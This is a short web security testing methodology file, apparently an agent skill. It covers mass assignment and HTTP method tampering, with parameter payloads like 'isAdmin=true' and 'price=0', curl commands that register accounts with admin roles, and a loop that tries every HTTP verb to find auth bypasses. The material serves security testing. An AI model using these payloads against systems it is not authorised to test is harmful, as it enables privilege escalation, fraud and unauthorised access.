---
name: mass-assignment-method-tampering
description: "Mass assignment and HTTP method tampering testing methodology. Test extra parameters and all HTTP verbs on every endpoint."
version: 1.0.0
---

# Mass Assignment & HTTP Method Tampering

## Mass Assignment

### What to Test
Add these parameters to any POST/PUT/PATCH request:
```
admin=true, isAdmin=true, role=admin, roles=["admin"]
permission=admin, permissions=["admin"], user_role=admin
type=premium, plan=enterprise, account_type=admin
is_premium=true, is_verified=true, is_owner=true
credit=99999, balance=99999, price=0
```

### Where to Test
- User registration: `POST /api/users` with extra fields
- Profile update: `PUT /api/users/me` or `PATCH /api/users/{id}`
- Object creation: `POST /api/orders`, `POST /api/items`
- Settings update: `PUT /api/settings`
- Role/permission endpoints

### Testing Script
```bash
# Registration with mass assignment
curl -X POST /api/register \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"Test123!","role":"admin","isAdmin":true}'

# Profile update with mass assignment  
curl -X PUT /api/user \
  -H "Content-Type: application/json" \
  -d '{"name":"test","isAdmin":true,"plan":"enterprise"}'
```

## HTTP Method Tampering

### Core Principle
Auth is often applied per-route, not per-method. A GET might be protected but DELETE might not.

### Testing Script
```bash
for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X $method $url)
  echo "$method -> $code"
done
```

### Key Observations
- Same endpoint, different HTTP method = different auth level
- 401 on GET but 200 on DELETE = authentication bypass
- 403 on GET but 200 on PATCH = authorization bypass  
- OPTIONS may reveal allowed methods
- HEAD may bypass auth same as GET

### Weird Methods to Try
`FOO`, `BAR`, `TEST`, `DEBUG`, `INVALID` — sometimes these bypass auth.
